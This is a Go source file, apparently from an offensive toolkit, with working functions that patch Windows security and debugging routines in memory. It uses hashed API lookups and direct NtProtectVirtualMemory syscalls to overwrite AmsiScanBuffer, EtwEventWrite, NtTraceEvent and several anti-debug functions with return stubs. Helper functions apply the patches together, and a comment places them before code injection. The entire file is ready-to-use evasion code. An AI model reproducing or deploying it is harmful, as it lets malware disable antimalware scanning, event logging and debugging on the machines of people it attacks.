package winapi

import (
	"fmt"
	"unsafe"

	"github.com/carved4/go-direct-syscall/pkg/obf"
	"github.com/carved4/go-direct-syscall/pkg/syscallresolve"
)

func PatchAMSI() error {
	// 1. Get the base address of amsi.dll
	amsiHash := obf.GetHash("amsi.dll")
	amsiBase := syscallresolve.GetModuleBase(amsiHash)
	if amsiBase == 0 {
		return fmt.Errorf("amsi.dll not found (not loaded)")
	}

	// 2. Get the address of AmsiScanBuffer
	functionHash := obf.GetHash("AmsiScanBuffer")
	procAddr := syscallresolve.GetFunctionAddress(amsiBase, functionHash)
	if procAddr == 0 {
		return fmt.Errorf("AmsiScanBuffer function not found")
	}

	// 3. Change protection to RWX for that page
	//    Use the "current process" pseudo‐handle (–1 or 0xFFFFFFFFFFFFFFFF)
	const (
		currentProcess      = ^uintptr(0)  // (ULONG_PTR)(-1)
		PAGE_EXEC_READWRITE = 0x40         // PAGE_EXECUTE_READWRITE
	)
	patch := []byte{0x31, 0xC0, 0xC3} // xor eax, eax; ret
	patchSize := uintptr(len(patch))
	oldProtect := uintptr(0)
	status, err := DirectSyscall(
		"NtProtectVirtualMemory",
		currentProcess,
		uintptr(unsafe.Pointer(&procAddr)),
		uintptr(unsafe.Pointer(&patchSize)),
		uintptr(PAGE_EXEC_READWRITE),
		uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil {
		return fmt.Errorf("NtProtectVirtualMemory (make RWX) failed: %v", err)
	}
	if !IsNTStatusSuccess(status) {
		return fmt.Errorf("NtProtectVirtualMemory (make RWX) returned: %s", FormatNTStatus(status))
	}

	// 4. Overwrite with the patch bytes
	for i := 0; i < len(patch); i++ {
		*(*byte)(unsafe.Pointer(procAddr + uintptr(i))) = patch[i]
	}

	// 5. Restore the original protection
	status, _ = DirectSyscall(
		"NtProtectVirtualMemory",
		currentProcess,
		uintptr(unsafe.Pointer(&procAddr)),
		uintptr(unsafe.Pointer(&patchSize)),
		oldProtect,
		uintptr(unsafe.Pointer(&oldProtect))) // we discard the new "oldProtect" here
	if !IsNTStatusSuccess(status) {
		return fmt.Errorf("NtProtectVirtualMemory (restore) returned: %s", FormatNTStatus(status))
	}

	return nil
}

func PatchETW() error {
	// 1. Get the base address of ntdll.dll
	ntdllHash := obf.GetHash("ntdll.dll")
	ntdllBase := syscallresolve.GetModuleBase(ntdllHash)
	if ntdllBase == 0 {
		return fmt.Errorf("ntdll.dll not found")
	}

	// 2. Get the address of EtwEventWrite
	functionHash := obf.GetHash("EtwEventWrite")
	procAddr := syscallresolve.GetFunctionAddress(ntdllBase, functionHash)
	if procAddr == 0 {
		return fmt.Errorf("EtwEventWrite function not found")
	}

	// 3. Change protection to RWX for that page
	const (
		currentProcess      = ^uintptr(0)
		PAGE_EXEC_READWRITE = 0x40
	)
	patch := []byte{0x31, 0xC0, 0xC3} // xor eax, eax; ret
	patchSize := uintptr(len(patch))  // Fixed: use actual patch size (3 bytes)
	oldProtect := uintptr(0)
	status, err := DirectSyscall(
		"NtProtectVirtualMemory",
		currentProcess,
		uintptr(unsafe.Pointer(&procAddr)),
		uintptr(unsafe.Pointer(&patchSize)),
		uintptr(PAGE_EXEC_READWRITE),
		uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil {
		return fmt.Errorf("NtProtectVirtualMemory (make RWX) failed: %v", err)
	}
	if !IsNTStatusSuccess(status) {
		return fmt.Errorf("NtProtectVirtualMemory (make RWX) returned: %s", FormatNTStatus(status))
	}

	// 4. Overwrite with the patch bytes
	for i := 0; i < len(patch); i++ {
		*(*byte)(unsafe.Pointer(procAddr + uintptr(i))) = patch[i]
	}

	// 5. Restore the original protection
	status, _ = DirectSyscall(
		"NtProtectVirtualMemory",
		currentProcess,
		uintptr(unsafe.Pointer(&procAddr)),
		uintptr(unsafe.Pointer(&patchSize)),
		oldProtect,
		uintptr(unsafe.Pointer(&oldProtect)))
	if !IsNTStatusSuccess(status) {
		return fmt.Errorf("NtProtectVirtualMemory (restore) returned: %s", FormatNTStatus(status))
	}

	return nil
}

// PatchDbgUiRemoteBreakin patches DbgUiRemoteBreakin to prevent remote debugger attachment
func PatchDbgUiRemoteBreakin() error {
	// 1. Get the base address of ntdll.dll
	ntdllHash := obf.GetHash("ntdll.dll")
	ntdllBase := syscallresolve.GetModuleBase(ntdllHash)
	if ntdllBase == 0 {
		return fmt.Errorf("ntdll.dll not found")
	}

	// 2. Get the address of DbgUiRemoteBreakin
	functionHash := obf.GetHash("DbgUiRemoteBreakin")
	procAddr := syscallresolve.GetFunctionAddress(ntdllBase, functionHash)
	if procAddr == 0 {
		return fmt.Errorf("DbgUiRemoteBreakin function not found")
	}

	// 3. Change protection to RWX
	const (
		currentProcess      = ^uintptr(0)
		PAGE_EXEC_READWRITE = 0x40
	)
	patch := []byte{0xC3} // ret
	patchSize := uintptr(len(patch))
	oldProtect := uintptr(0)
	status, err := DirectSyscall(
		"NtProtectVirtualMemory",
		currentProcess,
		uintptr(unsafe.Pointer(&procAddr)),
		uintptr(unsafe.Pointer(&patchSize)),
		uintptr(PAGE_EXEC_READWRITE),
		uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil {
		return fmt.Errorf("NtProtectVirtualMemory (make RWX) failed: %v", err)
	}
	if !IsNTStatusSuccess(status) {
		return fmt.Errorf("NtProtectVirtualMemory (make RWX) returned: %s", FormatNTStatus(status))
	}

	// 4. Overwrite with the patch bytes
	for i := 0; i < len(patch); i++ {
		*(*byte)(unsafe.Pointer(procAddr + uintptr(i))) = patch[i]
	}

	// 5. Restore the original protection
	status, _ = DirectSyscall(
		"NtProtectVirtualMemory",
		currentProcess,
		uintptr(unsafe.Pointer(&procAddr)),
		uintptr(unsafe.Pointer(&patchSize)),
		oldProtect,
		uintptr(unsafe.Pointer(&oldProtect)))
	if !IsNTStatusSuccess(status) {
		return fmt.Errorf("NtProtectVirtualMemory (restore) returned: %s", FormatNTStatus(status))
	}

	return nil
}

// PatchDbgBreakPoint patches DbgBreakPoint to prevent breakpoint interrupts
func PatchDbgBreakPoint() error {
	// 1. Get the base address of ntdll.dll
	ntdllHash := obf.GetHash("ntdll.dll")
	ntdllBase := syscallresolve.GetModuleBase(ntdllHash)
	if ntdllBase == 0 {
		return fmt.Errorf("ntdll.dll not found")
	}

	// 2. Get the address of DbgBreakPoint
	functionHash := obf.GetHash("DbgBreakPoint")
	procAddr := syscallresolve.GetFunctionAddress(ntdllBase, functionHash)
	if procAddr == 0 {
		return fmt.Errorf("DbgBreakPoint function not found")
	}

	// 3. Change protection to RWX
	const (
		currentProcess      = ^uintptr(0)
		PAGE_EXEC_READWRITE = 0x40
	)
	patch := []byte{0x31, 0xC0, 0xC3} // xor eax, eax; ret
	patchSize := uintptr(len(patch))
	oldProtect := uintptr(0)
	status, err := DirectSyscall(
		"NtProtectVirtualMemory",
		currentProcess,
		uintptr(unsafe.Pointer(&procAddr)),
		uintptr(unsafe.Pointer(&patchSize)),
		uintptr(PAGE_EXEC_READWRITE),
		uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil {
		return fmt.Errorf("NtProtectVirtualMemory (make RWX) failed: %v", err)
	}
	if !IsNTStatusSuccess(status) {
		return fmt.Errorf("NtProtectVirtualMemory (make RWX) returned: %s", FormatNTStatus(status))
	}

	// 4. Overwrite with the patch bytes
	for i := 0; i < len(patch); i++ {
		*(*byte)(unsafe.Pointer(procAddr + uintptr(i))) = patch[i]
	}

	// 5. Restore the original protection
	status, _ = DirectSyscall(
		"NtProtectVirtualMemory",
		currentProcess,
		uintptr(unsafe.Pointer(&procAddr)),
		uintptr(unsafe.Pointer(&patchSize)),
		oldProtect,
		uintptr(unsafe.Pointer(&oldProtect)))
	if !IsNTStatusSuccess(status) {
		return fmt.Errorf("NtProtectVirtualMemory (restore) returned: %s", FormatNTStatus(status))
	}

	return nil
}

// PatchNtTraceEvent patches NtTraceEvent to prevent trace event logging
func PatchNtTraceEvent() error {
	// 1. Get the base address of ntdll.dll
	ntdllHash := obf.GetHash("ntdll.dll")
	ntdllBase := syscallresolve.GetModuleBase(ntdllHash)
	if ntdllBase == 0 {
		return fmt.Errorf("ntdll.dll not found")
	}

	// 2. Get the address of NtTraceEvent
	functionHash := obf.GetHash("NtTraceEvent")
	procAddr := syscallresolve.GetFunctionAddress(ntdllBase, functionHash)
	if procAddr == 0 {
		return fmt.Errorf("NtTraceEvent function not found")
	}

	// 3. Change protection to RWX
	const (
		currentProcess      = ^uintptr(0)
		PAGE_EXEC_READWRITE = 0x40
	)
	patch := []byte{0x31, 0xC0, 0xC3} // xor eax, eax; ret
	patchSize := uintptr(len(patch))
	oldProtect := uintptr(0)
	status, err := DirectSyscall(
		"NtProtectVirtualMemory",
		currentProcess,
		uintptr(unsafe.Pointer(&procAddr)),
		uintptr(unsafe.Pointer(&patchSize)),
		uintptr(PAGE_EXEC_READWRITE),
		uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil {
		return fmt.Errorf("NtProtectVirtualMemory (make RWX) failed: %v", err)
	}
	if !IsNTStatusSuccess(status) {
		return fmt.Errorf("NtProtectVirtualMemory (make RWX) returned: %s", FormatNTStatus(status))
	}

	// 4. Overwrite with the patch bytes
	for i := 0; i < len(patch); i++ {
		*(*byte)(unsafe.Pointer(procAddr + uintptr(i))) = patch[i]
	}

	// 5. Restore the original protection
	status, _ = DirectSyscall(
		"NtProtectVirtualMemory",
		currentProcess,
		uintptr(unsafe.Pointer(&procAddr)),
		uintptr(unsafe.Pointer(&patchSize)),
		oldProtect,
		uintptr(unsafe.Pointer(&oldProtect)))
	if !IsNTStatusSuccess(status) {
		return fmt.Errorf("NtProtectVirtualMemory (restore) returned: %s", FormatNTStatus(status))
	}

	return nil
}

// PatchNtSystemDebugControl patches NtSystemDebugControl to prevent debug control operations
func PatchNtSystemDebugControl() error {
	// 1. Get the base address of ntdll.dll
	ntdllHash := obf.GetHash("ntdll.dll")
	ntdllBase := syscallresolve.GetModuleBase(ntdllHash)
	if ntdllBase == 0 {
		return fmt.Errorf("ntdll.dll not found")
	}

	// 2. Get the address of NtSystemDebugControl
	functionHash := obf.GetHash("NtSystemDebugControl")
	procAddr := syscallresolve.GetFunctionAddress(ntdllBase, functionHash)
	if procAddr == 0 {
		return fmt.Errorf("NtSystemDebugControl function not found")
	}

	// 3. Change protection to RWX
	const (
		currentProcess      = ^uintptr(0)
		PAGE_EXEC_READWRITE = 0x40
	)
	patch := []byte{0x31, 0xC0, 0xC3} // xor eax, eax; ret
	patchSize := uintptr(len(patch))
	oldProtect := uintptr(0)
	status, err := DirectSyscall(
		"NtProtectVirtualMemory",
		currentProcess,
		uintptr(unsafe.Pointer(&procAddr)),
		uintptr(unsafe.Pointer(&patchSize)),
		uintptr(PAGE_EXEC_READWRITE),
		uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil {
		return fmt.Errorf("NtProtectVirtualMemory (make RWX) failed: %v", err)
	}
	if !IsNTStatusSuccess(status) {
		return fmt.Errorf("NtProtectVirtualMemory (make RWX) returned: %s", FormatNTStatus(status))
	}

	// 4. Overwrite with the patch bytes
	for i := 0; i < len(patch); i++ {
		*(*byte)(unsafe.Pointer(procAddr + uintptr(i))) = patch[i]
	}

	// 5. Restore the original protection
	status, _ = DirectSyscall(
		"NtProtectVirtualMemory",
		currentProcess,
		uintptr(unsafe.Pointer(&procAddr)),
		uintptr(unsafe.Pointer(&patchSize)),
		oldProtect,
		uintptr(unsafe.Pointer(&oldProtect)))
	if !IsNTStatusSuccess(status) {
		return fmt.Errorf("NtProtectVirtualMemory (restore) returned: %s", FormatNTStatus(status))
	}

	return nil
}

// ApplyAllPatches applies all security bypass patches and returns a summary
func ApplyAllPatches() (successful []string, failed map[string]error) {
	successful = make([]string, 0)
	failed = make(map[string]error)

	patches := map[string]func() error{
		"AMSI":                  PatchAMSI,
		"ETW":                   PatchETW,
		"DbgUiRemoteBreakin":    PatchDbgUiRemoteBreakin,
		"DbgBreakPoint":         PatchDbgBreakPoint,
		"NtTraceEvent":          PatchNtTraceEvent,
		"NtSystemDebugControl":  PatchNtSystemDebugControl,
	}

	for name, patchFunc := range patches {
		if err := patchFunc(); err != nil {
			failed[name] = err
		} else {
			successful = append(successful, name)
		}
	}

	return successful, failed
}

// ApplyCriticalPatches applies only the most important patches (AMSI and ETW)
// These are the safest to apply pre injection post allocation, sometimes ETW will interfere with mem allocation for god knows why
func ApplyCriticalPatches() (successful []string, failed map[string]error) {
	successful = make([]string, 0)
	failed = make(map[string]error)

	patches := map[string]func() error{
		"AMSI": PatchAMSI,
		"ETW":  PatchETW,
	}

	for name, patchFunc := range patches {
		if err := patchFunc(); err != nil {
			failed[name] = err
		} else {
			successful = append(successful, name)
		}
	}

	return successful, failed
} 